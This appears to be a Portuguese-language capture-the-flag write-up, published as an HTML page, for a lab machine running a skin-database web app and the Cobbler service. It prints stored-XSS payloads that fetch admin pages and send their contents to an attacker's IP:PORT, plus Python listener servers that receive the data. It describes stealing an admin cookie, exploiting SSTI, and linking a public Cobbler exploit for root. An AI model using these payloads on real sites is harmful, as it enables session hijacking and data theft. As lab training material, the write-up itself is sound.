@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>stone</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- FONT -->
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg: #000000;
+            --panel: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.06);
+            --text: #cfd6ff;
+            --muted: #7d85a6;
+            --accent: #5b7cfa;
+        }
+
+        body {
+            margin: 60px auto;
+            width: 75%;
+            background: radial-gradient(circle at 20% 10%, #000000, var(--bg));
+            color: var(--text);
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 14px;
+        }
+
+        #h1 {
+            font-size: 22px;
+            margin-top: 0;
+        }
+
+        #asci {
+            font-size: 3px;
+            line-height: 1;
+            /* Mantém o espaçamento vertical correto */
+            margin: 0;
+        }
+
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        b {
+            color: red;
+        }
+
+        section {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 24px;
+            margin-top: 32px;
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+
+        <center>
+            <pre id="asci">
+       ⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀
+    ⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀
+    ⢀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⡀
+    ⠘⡀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⢀⠇
+    ⠀⣧⠀⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⣼⠀
+    ⠀⢸⣆⠀⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠀⣰⡏⠀
+    ⢱⡀⢿⣆⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡏⣰⡿⠀⡌
+    ⠀⢷⡈⢿⣧⣻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣟⣴⡿⢁⡾⠀
+    ⢀⠈⢷⣌⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⡿⣡⡾⠁⡀
+    ⠀⠳⡈⢻⣦⡻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣵⡟⢁⠞⠀
+    ⠀⠀⠙⢦⡹⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⢏⣴⠋⠀⠀
+    ⠀⠀⠀⡈⠻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠟⢁⠀⠀⠀
+    ⠀⠀⠀⠈⠢⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⠔⠁⠀⠀⠀
+    ⠀⠀⠀⠀⢀⠈⠛⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠛⠁⡀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠉⠒⠦⣬⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣥⠴⠒⠉⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠠⠤⢤⣌⣉⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣉⣡⡤⠤⠄⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣉⣭⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣯⣭⣭⣉⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢉⣉⣭⣽⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣭⣉⣉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠛⠛⠛⠛⢛⣩⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣭⡛⠛⠛⠛⠛⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠴⠾⠟⠛⣫⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣝⠛⠻⠷⠦⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠟⠛⣫⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣝⠛⠻⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠾⠛⣡⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⢿⣎⠛⠷⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠋⢀⠿⠋⡿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⠙⠿⡄⠙⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠇⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            </pre>
+        </center>
+        <section>
+            <h2>Recon</h2>
+            <p>Rodando o nmap temos 2 portas abertas:</p>
+            <pre>
+<b>22/tcp  open     ssh       syn-ack     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)</b>
+| ssh-hostkey:
+|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBCfBUkQ4szy00s+EbTzIMq4Cv/mOkGWCD8xewIgvZ4zDI5pPhUaVYNsPaUmYzXgi0DzCy6s//8a1YFcyH398Nc=
+|   256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
+|ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuDtua7ciUfRA2uUH+ergsCOdq0Aaoakru1kQ9/OWPs
+<b>80/tcp  open     http      syn-ack     Apache httpd 2.4.62</b>
+| http-methods:
+|  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Cobblestone - Official Website
+|_http-server-header: Apache/2.4.62 (Debian)
+125/tcp filtered locus-map no-response
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+            </pre>
+
+            <p>Indo pra aplicação se deparamos com a tela inicial:</p>
+            <center><img src="1.png" alt="" width="70%"></center>
+            <p>Rodei o fuzzing para pegar subdomains e diretórios mas não teve nada relevante.</p>
+            <p>Depois de olhar a aplicação e indo para o “Skin Database” temos uma pagina de login,<br>
+            primeiro iremos criar uma conta nela e fazer o login, depois de entrar na aplicação e dar uma <br>
+            fuçada, e indo até “suggest skins” percebemos que temos um campo de url ali.</p>
+            <center><img src="2.png" alt="" width="70%"></center>
+<h2>XSS</h2>
+            <p>Depois de fazer alguns teste percebi que ele é vulnerável a <b>XSS</b>, testando algumas coisas percebi <br>
+            que tem como fazer um ping na nossa máquina, outra coisa importante é que ele exibe uma <br>
+            mensagem que irá passar por uma verificação do ADM.</p>
+            <center><img src="3.png" alt="" width="80%"></center>
+            <center><img src="4.png" alt="" width="40%"></center>
+            <p>Payload usado:</p>
+            <b><pre>&lt;script src=http://10.10.16.80:9999/&gt;&lt;/script&gt;</pre></b>
+
+            <p>Sendo assim, iremos fazer uma exfiltração usando xss, temos um endpoint na aplicação que passa pela validação do admin, o "skins.php"</p>
+
+            <p>Para fazer a exfiltração dá pagina teremos que fazer o seguinte, como ele passa em método POST, teremos que subir um server em python que aceite o método POST e que a gente consiga receber os dados, o mini servidor ficou dessa forma:</p>
+            <h3>Server 1:</h3>
+            <pre><b>
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+import base64
+
+class ExfilHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        # Desabilita logs padrão para manter output limpo
+        pass
+    
+    def do_GET(self):
+        print(f"[+] Received GET request: {self.path}")
+        
+        # Parse da query string
+        if '?' in self.path:
+            path, query = self.path.split('?', 1)
+            params = urllib.parse.parse_qs(query)
+            
+            # Verifica se é exfiltração de dados
+            if 'dump' in params:
+                encoded_data = params['dump'][0]
+                try:
+                    # Decodifica base64
+                    decoded_data = base64.b64decode(encoded_data).decode('utf-8')
+                    print(f"\n[+] EXFILTRATED DATA:")
+                    print("="*50)
+                    print(decoded_data)
+                    print("="*50)
+                    
+                    # Salva em arquivo
+                    with open('exfiltrated_data.html', 'w') as f:
+                        f.write(decoded_data)
+                    print(f"[+] Data saved to 'exfiltrated_data.html'")
+                    
+                except Exception as e:
+                    print(f"[-] Error decoding data: {e}")
+                    print(f"[+] Raw encoded data: {encoded_data}")
+        
+        # Resposta padrão
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(b'OK')
+    
+    def do_POST(self):
+        print(f"[+] Received POST request: {self.path}")
+        
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length)
+        
+        try:
+            # Tenta parse como form data
+            params = urllib.parse.parse_qs(post_data.decode())
+            if 'data' in params:
+                data = urllib.parse.unquote(params['data'][0])
+                print(f"\n[+] EXFILTRATED DATA (POST):")
+                print("="*50)
+                print(data)
+                print("="*50)
+                
+                # Salva em arquivo
+                with open('exfiltrated_data_post.html', 'w') as f:
+                    f.write(data)
+                print(f"[+] Data saved to 'exfiltrated_data_post.html'")
+        except Exception as e:
+            print(f"[-] Error processing POST data: {e}")
+            print(f"[+] Raw POST data: {post_data}")
+        
+        # Resposta
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(b'OK')
+
+if __name__ == "__main__":
+    PORT = 9191  # Mudei para a porta do seu payload
+    server = HTTPServer(("0.0.0.0", PORT), ExfilHandler)
+    print(f"[*] Server listening on port {PORT}")
+    print(f"[*] Waiting for exfiltration requests...")
+    print(f"[*] Use Ctrl+C to stop")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print(f"\n[*] Server stopped")</b>
+            </pre>    
+        <p>Resumidamente ele vai receber a conexão na porta 9191 e codificar os dados em base64</p>
+        <p>Com o server.py escutando agora vamos para o payload de exfiltração:</p>
+        <b><pre><code>&lt;img src=x onerror="
+  fetch('/skins.php')
+    .then(r =&gt; r.text())
+    .then(data =&gt; fetch('http://IP:PORTA/?skins.php=' + btoa(data)))
+"&gt;</code></pre></b>
+    
+    <p>Esse payload vai pegar e jogar para o nosso server.py, esperamos um pouco e recebemos nossa requisição: </p>
+    <center><img src="5.png" alt="" width="45%"></center>
+    <p>para desencodar ele iremos usar o CyberChef</p>
+    <center><img src="6.png" alt="" width="48%"></center>
+    <p>Passando esse contéudo para um arquivo .html podemos ver que é de uma das páginas de admin. <br>
+        <br>
+        <center><img src="7.png" alt="" width="70%"></center>
+    Indo até o final dessa página vemos o endpoint <b>skins_app_admin_server_info.php</b>, se você tentar <br>
+    executar o mesmo processo isso não irá funcionar dessa vez. </p>
+    <p>Dei uma pesquisada mais afundo sobre isso e encontrei uma forma de fazer a exfiltração usando <br>
+    um código .js e também tive que criar outro server2.py</p>
+    
+    <h3>Server 2:</h3>
+    <b><pre>from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+import os
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length)
+
+        params = urllib.parse.parse_qs(post_data.decode())
+        data = params.get('data', [''])[0]
+
+        print(f"[+] Received POST data:\n{data}\n")
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+    def do_GET(self):
+        if self.path == '/payload.js':
+            if os.path.exists('payload.js'):
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/javascript')
+                self.end_headers()
+                with open('payload.js', 'rb') as f:
+                    self.wfile.write(f.read())
+            else:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b'File not found')
+        else:
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"GET method works")
+
+if __name__ == "__main__":
+    server = HTTPServer(("0.0.0.0", 9999), Handler)
+    print("[*] Listening on port 8080 for POST exfil...")
+    server.serve_forever()</pre></b>
+
+    <h3>Payload.js</h3>
+    <b><pre>var xhr = new XMLHttpRequest();
+xhr.open('GET', '/skins_app_admin_server_info.php', true);
+xhr.withCredentials = true;
+xhr.responseType = 'document';
+
+xhr.onload = function() {
+    var html = xhr.response.documentElement.outerHTML;
+
+    // Cria formulário para exfiltrar via POST
+    var form = document.createElement('form');
+    form.action = 'http://IP:PORTA/';
+    form.method = 'POST';
+    form.enctype = 'application/x-www-form-urlencoded';
+
+    var input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'data';
+    input.value = encodeURIComponent(html);
+    form.appendChild(input);
+
+    document.body.appendChild(form);
+    form.submit();
+};
+
+xhr.send();</pre></b>
+
+    <p>Obeservação aqui é que o “payload.js” e “server2.py” deve estar com a mesma porta iguais.</p>
+    <p>Depois de que ja estiver tudo pronto, coloque o server para rodar e vamos mandar esse payload para fazer a exfiltração:</p>
+    <b><pre><code>&lt;script src=http://IP:PORTA/payload.js&gt;&lt;/script&gt;</code></pre></b>
+    <p>Dessa forma aqui: </p>
+    <center><img src="8.png" alt="" width="75%"></center>
+    <p>Com o server rodando, envie a requisição e aguarde alguns segundos e se estiver tudo certo você vai receber isso aqui no seu terminal:</p>
+    <center><img src="9.png" alt="" width="50%"></center>
+    <p>Vamos novamente ao CyberChef e colar isso lá e temos outra pagina html:</p>
+    <center><img src="10.png" alt="" width="50%"></center>
+
+
+    <p>E temos acesso ao phpinfo do ADMIN:</p>
+    <center><img src="11.png" alt="" width="60%"></center>
+    <p>Procure pelo Cookie do ADMIN, volte a pagina troque os cookie e recarregue a página:</p>
+    <center><img src="12.png" alt="" width="75%"></center>
+    <h2>SSTI</h2>
+    <p>Com acesso a mais recursos agora, temos a aba <b>User Management</b>.</p>
+    <center><img src="13.png" alt="" width="60%"></center>
+    <p>A página é vulnerável a SSTI, passando a requisição para o Burpsuite consigo executar alguns comandos:</p>
+    <center><img src="14.png" alt="" width="50%"></center>
+    <center><img src="15.png" alt="" width="85%"></center>
+    <P>Acabei esquecendo de anotar essa parte, mas resumindo: <br>
+        Tem um dump do mysql através desse SSTI no diretório <b>db</b>, você irá conseguir as credencias para logar no ssh.
+    </P>
+
+    <h2>Privesc</h2>
+    <p>Dentro dá maquina podemos pegar primeira flag de user</p>
+    <center><img src="16.png" alt="" width="50%"></center>
+    <p>Você vai perceber que não consegue executar vários comandos pois está dentro de <b>rbash</b></p>
+    <center><img src="17.png" alt="" width="50%"></center>
+    <p>Eu pesquisei bastante se tinha como dar bypass nele e não consegui fazer isso, então fui para <br>
+    outras alternativas, enumerando os serviços rodando temos um "diferente"</p>
+    <center><img src="18.png" alt="" width="80%"></center>
+    <p>Verificando as portas internas percebi que ela tem um serviço rodando na porta <b>25151</b>:</p>
+    <center><img src="19.png" alt="" width="70%"></center>
+    <p>O Serviço <b>cobblerd</b> é quem está rodando nessa porta, então decide tunelar ela pra minha máquina:</p>
+    <b><pre>ssh -L 25151:127.0.0.1:25151 cobble@10.10.11.81</pre></b>
+    <p>Abrindo ela no navegador recebemos um erro:</p>
+    <center><img src="20.png" alt="" width="79%"></center>
+    <p>Depois de um bom tempo pesquisando sobre o <b>cobblerd</b> achei uma CVE para ele:</p>
+    <a href="https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC">CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC</a>
+    <p>Executando a POC da maneira indicada nós conseguimos a flag de Root:</p>
+    <center><img src="21.png" alt="" width="60%"></center>
+    <h3>Pwned!</h3>
+                    <center><p>by Leonardo Kauan - krnl</p></center>
+        </section>
+        
+    </main>
+
+</body>
+
+</html>
